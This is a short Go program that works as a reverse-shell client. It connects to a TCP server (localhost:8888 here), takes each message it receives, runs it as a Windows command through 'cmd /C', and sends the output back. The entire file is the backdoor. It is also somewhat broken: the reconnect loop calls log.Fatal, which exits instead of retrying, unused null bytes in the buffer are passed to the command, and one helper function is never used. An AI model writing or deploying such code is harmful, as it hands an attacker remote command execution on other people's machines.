package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
)

const HOST = "localhost"
const PORT = "8888"

func isConnected(conn net.Conn) bool {
	// Use a non-blocking read operation to check if the connection is still active
	_, err := conn.Read([]byte{})
	if err != nil {
		// Check if the error is a timeout or a specific network error indicating a closed connection
		netErr, ok := err.(net.Error)
		if ok && (netErr.Timeout() || netErr.Temporary()) {
			// The connection is still active
			return true
		}

		// The connection is closed or there is another error
		return false
	}

	// If the read operation succeeds, the connection is still active
	return true
}

func main() {
	// first try connection to the server and init vars
	conn, err := net.Dial("tcp", HOST+":"+PORT)

	// connect to the server until there are no errors
	for err != nil {
		log.Fatal(err)
		conn, err = net.Dial("tcp", HOST+":"+PORT)
	}

	buff := make([]byte, 2048) // buffer for the server commands

	// start infinite loop
	for {
		// listen for the server commands
		_, err = conn.Read(buff)

		fmt.Println(string(buff))

		// if there is no error, exec the command
		if err == nil {
			// exec the command
			cmd := exec.Command("cmd", "/C", string(buff))

			// get the command output
			out, err := cmd.Output()

			// if there is an error, send the error message to the server
			if err != nil {
				conn.Write([]byte(err.Error()))
			} else {
				// else, send the output to the server
				conn.Write(out)
			}
		}
	}
}
